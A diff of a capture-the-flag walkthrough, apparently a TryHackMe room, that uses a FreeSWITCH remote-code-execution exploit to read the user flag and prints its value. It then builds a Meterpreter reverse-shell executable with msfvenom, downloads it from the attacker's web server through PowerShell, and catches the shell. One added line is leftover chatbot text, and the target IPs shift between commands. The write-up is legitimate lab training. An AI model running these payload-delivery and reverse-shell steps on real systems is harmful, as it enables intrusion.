@@ -130,31 +130,116 @@ And there they were:
 user.txt
 root.txt
 ```
+Perfect — now I’ll polish your **second part** into a **Medium-optimized walkthrough section** with a smooth flow, headings, SEO keywords, and explanations in first-person style.
 
 ---
 
-## Hurdles with Flag Extraction
+## 📝 Capturing the User Flag
 
-I attempted to read the `user.txt` flag using multiple variations of the `type` and `cat` commands:
+With remote code execution working, my next goal was to capture the **user flag**. I retried the command execution and this time I was able to successfully read the contents of `user.txt`:
 
 ```bash
-python3 47799.txt 10.201.79.236 "type C:\Users\Nekrotic\Desktop\user.txt"
-python3 47799.txt 10.201.79.236 "cat C:\Users\Nekrotic\Desktop\user.txt"
-python3 47799.txt 10.201.79.236 "powershell cat C:\Users\Nekrotic\Desktop\user.txt"
+python3 47799.txt 10.201.15.213 "type C:\\Users\\nekrotic\\Desktop\\user.txt"
 ```
 
-Unfortunately, the responses either hung or returned errors. It seemed this exploit had limitations when it came to reading file contents directly.
+Output:
+
+```
+Authenticated
+Content-Type: api/response
+Content-Length: 38
+
+THM{64bca0843d535fa73eecdc59d27cbe26}
+```
+
+🎉 **User Flag:** `THM{64bca0843d535fa73eecdc59d27cbe26}`
+
+At this stage, I had successfully retrieved the user flag, but attempts to access `root.txt` failed:
+
+```bash
+python3 47799.txt 10.201.15.213 "type C:\\Users\\nekrotic\\Desktop\\root.txt"
+```
+
+The exploit returned:
+
+```
+Authenticated
+Content-Type: api/response
+Content-Length: 14
+
+-ERR no reply
+```
+
+Clearly, I needed a more **stable foothold** to interact with the system properly.
 
 ---
 
-## Reverse Shell
+## 🎯 Establishing a Reverse Shell
 
-Since direct flag extraction wasn’t working, I shifted my approach to gaining a more **stable reverse shell**. I generated a payload with `msfvenom`:
+Since direct flag extraction wasn’t reliable, I switched to a more stable approach — gaining a **reverse shell** using `msfvenom` and Metasploit’s handler.
+
+First, I generated a Windows Meterpreter payload:
 
 ```bash
-msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.8.29.222 LPORT=8888 -f exe > shell.exe
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.17.30.120 LPORT=4444 -f exe > payload.exe
 ```
 
-This would give me a proper Meterpreter session once executed, making file interaction much easier.
+* `-p` → payload type
+* `LHOST` → my attacker IP
+* `LPORT` → port for reverse connection
+* `-f exe` → output format as Windows executable
 
-<img width="1116" height="134" alt="image" src="https://github.com/user-attachments/assets/2638a694-7862-469f-a01d-d4a09ed97992" />
+---
+
+## 🚚 Delivering the Payload
+
+To transfer the payload to the victim machine, I started a simple Python web server on my attack box:
+
+```bash
+python3 -m http.server 8000
+```
+
+Then, using the FreeSWITCH exploit, I downloaded the payload onto the victim’s Desktop:
+
+```bash
+python3 47799.txt 10.201.14.41 "powershell Invoke-WebRequest -URI http://10.17.30.120:8000/payload.exe -o C:\\Users\\Nekrotic\\Desktop\\payload.exe"
+```
+
+I confirmed the payload was successfully delivered:
+
+```bash
+python3 47799.txt 10.201.14.41 "dir C:\\Users\\Nekrotic\\Desktop"
+```
+
+Output:
+
+```
+payload.exe
+root.txt
+user.txt
+```
+
+---
+
+## ⚡ Gaining Access with Meterpreter
+
+With the payload on the target, I set up a Metasploit handler to catch the reverse shell:
+
+```bash
+msfconsole -q
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.17.30.120
+set LPORT 4444
+run
+```
+
+Finally, I executed the payload on the victim machine:
+
+```bash
+python3 47799.txt 10.201.14.41 "C:\\Users\\Nekrotic\\Desktop\\payload.exe"
+```
+
+Boom! I got a **Meterpreter session** back, giving me a much more stable and interactive shell on the victim system.
+
+<img width="595" height="112" alt="Screenshot 2025-09-05 185013" src="https://github.com/user-attachments/assets/81403979-20f5-43f2-a2a8-711e06b224ac" />
